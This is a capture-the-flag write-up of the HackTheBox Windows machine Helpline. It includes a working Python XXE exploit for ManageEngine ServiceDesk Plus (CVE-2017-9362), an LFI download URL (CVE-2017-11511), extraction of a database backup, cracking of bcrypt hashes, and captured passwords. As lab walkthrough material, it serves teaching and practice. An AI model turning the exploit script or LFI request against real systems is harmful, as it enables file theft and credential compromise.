---
title: HTB: Helpline
url: https://0xdf.gitlab.io/2019/08/17/htb-helpline.html
date: 2019-08-17T14:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: ctf, hackthebox, htb-helpline, nmap, manageengine, servicedesk, default-creds, excel, cve-2017-9362, xxe, responder, cve-2017-11511, lfi, hashcat
---

![](https://0xdfimages.gitlab.io/img/helpline-cover.png) Helpline was a really difficult box, and it was an even more difficult writeup. It has *so* many paths, and yet all were difficult in some way. It was also one that really required Windows as an attack platform to do the intended way. I got lucky in that this was the box I had chosen to try out [Commando VM](/2019/04/15/commando-vm-lessons.html). Give the two completely different attack paths on Windows and Kali, I’ll break this into three posts. In the first post, I’ll do enumeration up to an initial shell. Then in one post I’ll show how I solved it from Commando (Windows) using the intended paths. In the other post, I’ll show how to go right to a shell as SYSTEM, and work backwards to get the root flag and eventually the user flag.

## Box Info

| Name | [Helpline](https://hackthebox.com/machines/helpline)  [Helpline](https://hackthebox.com/machines/helpline) [Play on HackTheBox](https://hackthebox.com/machines/helpline) |
| --- | --- |
| Release Date | [23 Mar 2019](https://twitter.com/hackthebox_eu/status/1109005906686169088) |
| Retire Date | 17 Aug 2019 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Helpline |
| Radar Graph | Radar chart for Helpline |
| First Blood User | 1 day01:44:24[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 23:38:22[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [egre55 egre55](https://app.hackthebox.com/users/1190) |

## Recon

### nmap

`nmap` reveals some typical Windows ports, SMB (135/445), WinRM (5985), as well as HTTP on 8080:

```

PS C:\Users\0xdf\hackthebox\helpline-10.10.10.132 > nmap -p- --min-rate 10000 -oA .\scans\nmap-alltcp 10.10.10.132
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-09 22:44 GMT Daylight Time
Nmap scan report for 10.10.10.132
Host is up (0.046s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
8080/tcp  open  http-proxy
49667/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.30 seconds

PS C:\Users\0xdf\hackthebox\helpline-10.10.10.132 > nmap -sC -sV -p 135,445,5985,8080 -oA .\scans\nmap-scripts 10.10.10.132
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-09 22:50 GMT Daylight Time
Nmap scan report for 10.10.10.132
Host is up (0.022s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http-proxy    -
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Set-Cookie: JSESSIONID=0B502E6026AA7DC4F4CCE78354D49A53; Path=/; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 01:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Vary: Accept-Encoding
|     Date: Tue, 09 Apr 2019 20:41:02 GMT
|     Connection: close
|     Server: -
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <script language='JavaScript' type="text/javascript" src='/scripts/Login.js?9309'></script>
|     <script language='JavaScript' type="text/javascript" src='/scripts/jquery-1.8.3.min.js'></script>
|     <link href="/style/loginstyle.css?9309" type="text/css" rel="stylesheet"/>
|     <link href="/style/new-classes.css?9309" type="text/css" rel="stylesheet">
|     <link href="/style/new-classes-sdp.css?9309" type="text/css" rel="stylesheet">
|     <link href="/style/conflict-fix.css?9309" type="text/css" rel="stylesheet">
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Set-Cookie: JSESSIONID=E52D8377CC41529A04AB536770FA44A7; Path=/; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 01:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Vary: Accept-Encoding
|     Date: Tue, 09 Apr 2019 20:41:03 GMT
|     Connection: close
|     Server: -
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <script language='JavaScript' type="text/javascript" src='/scripts/Login.js?9309'></script>
|     <script language='JavaScript' type="text/javascript" src='/scripts/jquery-1.8.3.min.js'></script>
|     <link href="/style/loginstyle.css?9309" type="text/css" rel="stylesheet"/>
|     <link href="/style/new-classes.css?9309" type="text/css" rel="stylesheet">
|     <link href="/style/new-classes-sdp.css?9309" type="text/css" rel="stylesheet">
|_    <link href="/style/conflict-fix.css?9309" type="text/css" rel="stylesheet">
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: -
|_http-title: ManageEngine ServiceDesk Plus
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.70%I=7%D=4/9%Time=5CAD13B1%P=i686-pc-windows-windows%r
SF:(GetRequest,25D6,"HTTP/1\.1\x20200\x20OK\r\nSet-Cookie:\x20JSESSIONID=0
...[snip]...
SF:rel=\"stylesheet\">");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1h09m39s, deviation: 0s, median: -1h09m39s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-04-09 21:42:36
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.76 seconds

```

There’s not much to enumerate at this point on 5985, but it’s absolutely worth noting that if I find credentials, I might be able to connect over WinRM.

### SMB - TCP 445

`net view` without a username gives me access denied:

```

C:\Users\0xdf>net view 10.10.10.132
System error 5 has occurred.

Access is denied.

```

Similarly, if I open in Windows Explorer and visit `\\10.10.10.132`, I get a prompt for credentials:

![1555088418879](https://0xdfimages.gitlab.io/img/1555088418879.png)

Not much else to see here unless I can find some credentials.

### ManagedEngine - TCP 8080

#### Site

The site hosted is an instance of MangeEngine ServiceDesk Plus:

![1555096750048](https://0xdfimages.gitlab.io/img/1555096750048.png)

I will note that the bottom right hand corner gives me a version of 9.3.

#### Default Guest Account

[This post](https://pitstop.manageengine.com/portal/community/topic/default-administrator-password-not-working-after-initial-install) talks about the default accounts for ManageEngine ServiceDesk Plus:
- administrator / administrator
- guest / guest

The administrator login doesn’t work, but the guest login does:

![1555099757085](https://0xdfimages.gitlab.io/img/1555099757085.png)

Even the guest login will enable some authenticated vulnerabilities.

#### Password+Audit.xslx

Logged in as guest, on the “Solutions” tab, there’s a series of items. At the very bottom, there’s one entitled “Password Audit”:

![1555100073296](https://0xdfimages.gitlab.io/img/1555100073296.png)

Clicking on it, there’s a note pointing towards the attachment:

![1555100122618](https://0xdfimages.gitlab.io/img/1555100122618.png)

The attachment has a sheet called “Password Audit” with a chart:

![1555100250346](https://0xdfimages.gitlab.io/img/1555100250346.png)

I decided to check for code or anything else in the editor, so I hit Alt+f11 to open VBA, and right away I noticed a second sheet:

![1555100297166](https://0xdfimages.gitlab.io/img/1555100297166.png)

Back in Excel, right-click on the sheets and select “Unhide…”

![1555100328934](https://0xdfimages.gitlab.io/img/1555100328934.png)

The popup asks me to select a sheet. The only option is “Password Data”:

![1555100355976](https://0xdfimages.gitlab.io/img/1555100355976.png)

This sheet has a bunch of good info, including some passwords to try, and a location for audit details saved at `C:\Temp\Password Audit\it_logins.txt` on HELPLINE:

![1555100429458](https://0xdfimages.gitlab.io/img/1555100429458.png)

## ME SDP Vulnerabilities

This version of ManageEngine ServiceDesk Plus has numerous vulnerabilities in it. I used two to gather additional information.

### CVE-2017-9362 - XXE

#### Vulnerability

There is an XML External Entity vulnerability that lets me get files from the host. This vulnerability is described [here](https://labs.integrity.pt/advisories/cve-2017-9362/index.html). I wrote a quick script that allows me to request a file:

```

import requests
import sys

xxe = """<!DOCTYPE foo [<!ENTITY xxe15d41 SYSTEM "file:///{filepath}"> ]><API version='1.0' locale='en'>
    <records>
        <record>
            <parameter>
                <name>CI Name</name>
                <value>Tomcat Server 3 0xdfstart&xxe15d41;0xdfstop</value>
            </parameter>
        </record>
    </records>
</API>
"""

def get_file(ip_address, filepath):
    login_url = "http://"+ip_address+":8080/j_security_check"
    api_url = "http://"+ip_address+":8080/api/cmdb/ci"
    login_data={"j_username": "guest", "j_password": "guest", "LDAPEnable": "false", "hidden": "Select a Domain", "hidden": "For Domain", "AdEnable": "false", "DomainCount": "0", "LocalAuth": "No", "LocalAuthWithDomain": "No", "dynamicUserAddition_status": "true", "localAuthEnable": "true", "logonDomainName": "-1", "loginButton": "Login", "checkbox": "checkbox"}
    
    with requests.Session() as s:
        s.post(login_url, data=login_data)
        xxe_data={"OPERATION_NAME": "add", "INPUT_DATA": xxe.format(filepath=filepath)}
        response = s.post(api_url, data=xxe_data)
        try:
                print(response.text[response.text.index("0xdfstart") + len("0xdfstart"):response.text.index("0xdfstop")].replace("\\r\\n","\n"))
        except ValueError:
            print("Error: No data returned")

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} [ip] [filepath]\nfilepath can be file on target, or smb or http uri")
    sys.exit(1)
get_file(sys.argv[1],sys.argv[2].replace("\\", "/"))

```

I can use it to grab `win.ini` for a test:

```

PS C:\Users\0xdf\hackthebox\helpline-10.10.10.132 > python .\mesep_xxe.py 10.10.10.132 "C:\windows\win.ini"
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1

```

#### Responder

I did try to run `responder` and give it an path to a share on my host. I think you can run `responder` from Windows, but I failed to pull it off. When I posted my [lessons learned on Commando](/2019/04/15/commando-vm-lessons.html#responder), @mcohmi suggested `Inveigh`:

> You should try Inveigh instead of that Windows responder.
>
> — Ohm-I 🚉 PAX West (@mcohmi) [April 16, 2019](https://twitter.com/mcohmi/status/1118003243882139648?ref_src=twsrc%5Etfw)

I still need to test that, but since it ended up not being important here, I’ll just show the Kali `responder` results. The hashes I got were not helpful:

```

root@kali# python3 mesep_xxe.py 10.10.10.132 //10.10.14.14/share/test.txt
Error: No data returned

```

```

[SMBv2] NTLMv2-SSP Client   : 10.10.10.132
[SMBv2] NTLMv2-SSP Username : \iX
[SMBv2] NTLMv2-SSP Hash     : iX:::918a26cfdd690e81::
[SMBv2] NTLMv2-SSP Client   : 10.10.10.132
[SMBv2] NTLMv2-SSP Username : \iX
[SMBv2] NTLMv2-SSP Hash     : iX:::07d76d4d1f724c69::

```

These hashes are indicative of a SYSTEM account. That’s interesting, as it means that ME SDP is likely running as SYSTEM, but that I don’t get any hashes from it to crack.

#### it\_logins.txt

In the password audit xlsx document, there was a reference to additional information located at `C:\Temp\Password Audit\it_logins.txt` on HELPLINE. I’ll grab that file with the script:

```

PS > python .\mesep_xxe.py 10.10.10.132 "C:\temp\Password Audit\it_logins.txt"

local Windows account created

username: alice
password: $sys4ops@megabank!
admin required: no

shadow admin accounts:

mike_adm:Password1
dr_acc:dr_acc

```

Now I have more passwords to try.

### CVE-2017-11511 - LFI / Arbitrary File Download

#### Vulnerability

This is [another vulnerability](https://www.tenable.com/security/research/tra-2017-31) that provides access to files on the system, this time through a local file include. However, in this case, the target file must be given as a relative path to one of four directories associated with the SDP install, including option 4 which seems to intentionally open up all of the SDP install. The vulnerability allows me to request any file relative to that path.

I can’t get `win.ini` like they show in the example, since it’s on `c:\`, and SDP is installed on `e:\`:

![1555101583626](https://0xdfimages.gitlab.io/img/1555101583626.png)

#### Extract Database Backup

[This article](https://blog.netxp.fr/manageengine-deep-exploitation/) shows how to use this exploit to get the database back-ups from target.

First, I’ll collect `E:\ManageEngine\ServiceDesk\bin\SDPbackup.log` from `http://10.10.10.132:8080/fosagent/repl/download-file?basedir=4&filepath=\bin\SDPbackup.log`. At the very bottom, I’ll find the following:

```

Zipfile created: E:\ManageEngine\ServiceDesk\bin\..\\backup\backup_postgres_9309_fullbackup_04_12_2019_17_43\backup_postgres_9309_fullbackup_04_12_2019_17_43_part_1.data
Zipfile created: E:\ManageEngine\ServiceDesk\bin\..\\backup\backup_postgres_9309_fullbackup_04_12_2019_17_43\backup_postgres_9309_fullbackup_04_12_2019_17_43_part_2.data
Backup Completed Successfully.

```

Now I have the location of two files that make up the database backup.

I’ll request both of those:
- `backup_postgres_9309_fullbackup_04_12_2019_17_43_part_1.data`
- `backup_postgres_9309_fullbackup_04_12_2019_17_43_part_1.data`

I’ll rename each of these to `.zip`, and then unzip:

```

PS C:\Users\0xdf\hackthebox\helpline-10.10.10.132 > Expand-Archive .\backup_postgres_9309_fullbackup_04_12_2019_17_43_part_1.zip

PS C:\Users\0xdf\hackthebox\helpline-10.10.10.132 > Expand-Archive .\backup_postgres_9309_fullbackup_04_12_2019_17_43_part_2.zip

```

Part2 contains the the xlsx file I already have:

```

PS C:\Users\0xdf\hackthebox\helpline-10.10.10.132\backup_postgres_9309_fullbackup_04_12_2019_17_43_part_2 > gci -af -Recurse

    Directory: C:\Users\0xdf\hackthebox\helpline-10.10.10.132\backup_postgres_9309_fullbackup_04_12_2019_17_43_part_2

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/12/2019   5:44 PM            124 filelist.txt

    Directory: C:\Users\0xdf\hackthebox\helpline-10.10.10.132\backup_postgres_9309_fullbackup_04_12_2019_17_43_part_2\f
    ileAttachments\Solutions\Jan2019\8

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/12/2019   5:44 PM          17775 Password Audit.xlsx

```

Part1 contains a ton of sql files. The ones that I found to be of interest were `aaapassword.sql` and `aaalogin.sql`:

```

PS C:\Users\0xdf\hackthebox\helpline-10.10.10.132\backup_postgres_9309_fullbackup_04_12_2019_17_43_part_1 > cat .\aaapassword.sql
INSERT INTO AaaPassword (password_id,password,algorithm,salt,passwdprofile_id,passwdrule_id,createdtime,factor) VALUES
(1, N'$2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG', N'bcrypt', N'$2a$12$6VGARvoc/dRcRxOckr6Wmu', 2, 1, 1545350288006, 12);
(302, N'$2a$12$2WVZ7E/MbRgTqdkWCOrJP.qWCHcsa37pnlK.0OyHKfd4lyDweMtki', N'bcrypt', N'$2a$12$2WVZ7E/MbRgTqdkWCOrJP.', 2, 1, 1545428506907, NULL);
(303, N'$2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm', N'bcrypt', N'$2a$12$Em8etmNxTinGuub6rFdSwu', 2, 1, 1545428808687, NULL);
(2, N'$2a$12$hmG6bvLokc9jNMYqoCpw2Op5ji7CWeBssq1xeCmU.ln/yh0OBPuDa', N'bcrypt', N'$2a$12$hmG6bvLokc9jNMYqoCpw2O', 2, 1, 1545428960671, 12);
(601, N'$2a$12$6sw6V2qSWANP.QxLarjHKOn3tntRUthhCrwt7NWleMIcIN24Clyyu', N'bcrypt', N'$2a$12$6sw6V2qSWANP.QxLarjHKO', 2, 1, 1545514864248, NULL);
(602, N'$2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa', N'bcrypt', N'$2a$12$X2lV6Bm7MQomIunT5C651.', 2, 1, 1545515091170, NULL);
(603, N'$2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu', N'bcrypt', N'$2a$12$gFZpYK8alTDXHPaFlK51Xe', 2, 1, 1545516114589, NULL);
(604, N'$2a$12$4.iNcgnAd8Kyy7q/mgkTFuI14KDBEpMhY/RyzCE4TEMsvd.B9jHuy', N'bcrypt', N'$2a$12$4.iNcgnAd8Kyy7q/mgkTFu', 2, 1, 1545517215465, NULL);

PS C:\Users\0xdf\hackthebox\helpline-10.10.10.132\backup_postgres_9309_fullbackup_04_12_2019_17_43_part_1 > cat .\aaalogin.sql
INSERT INTO AaaLogin (login_id,user_id,name,domainname) VALUES
(1, 3, N'guest', N'-');
(2, 4, N'administrator', N'-');
(302, 302, N'luis_21465', N'-');
(303, 303, N'zachary_33258', N'-');
(601, 601, N'stephen', N'-');
(602, 602, N'fiona', N'-');
(603, 603, N'mary', N'-');
(604, 604, N'anne', N'-');

```

With those two files, I now have usernames and hashes for various accounts.

#### Crack Passwords

These are bcrypt hashes, which are *super* slow to crack. To run all of rockyou was going to take my computer 40+ days. That said, in the first 10 minutes, I got three results:

```

$ hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt --force

```

```

$2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu:1234567890 - 603 mary
$2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm:0987654321 - 303 zachary_33258
$2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa:1q2w3e4r - 602 fiona

```

I did log into SDP with each of these, but didn’t find any information that would help me solve the box.

### SDP Privesc

There is another exploit that gave me administrator access to SDP, rather than just guest access. I’ll cover that in the Kali solution.

## Fork

At this point I have two completely different paths I can pursue. I’ve mapped out the paths I’ll show for Helpline in the following flow chat:

[![flowchart](https://0xdfimages.gitlab.io/img/helpline-flow.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/helpline-flow.png)

Things in yellow were in this post. Things in red are in the Windows Commando post. Things in grey are in the Linux Kali post.

Click on either of the paths below, or use the Table of Contents on the left:

[### From Windows

![commando](/icons/commando.png)
Use alice's creds to connect over WinRM, then zachary's to read event logs. In those logs, I'll find tolu's creds. With a shell as tolu, I'll get access to E:, where I find a PowerShell script I can inject into, once I bypass the filters, to get a shell as leo. On leo's desktop, I'll find admin creds in an xml file, which I can convert back to raw creds, and connect via WinRM.](/2019/08/17/htb-helpline-win.html)

[### From Linux

![kali](/icons/kali.png)
I'll show two ways to get administrator access into SDP, one via exploit, and one using alice's shell to change the administrator password in the postgres database. From there, I can use a trigger to get a shell as SYSTEM. But because the important files are protected with EFS, I can't just read them. I'll show how to use mimikats to decrypt the files. I'll also show how to install VNC and connect in from there to get the flags.](/2019/08/17/htb-helpline-kali.html)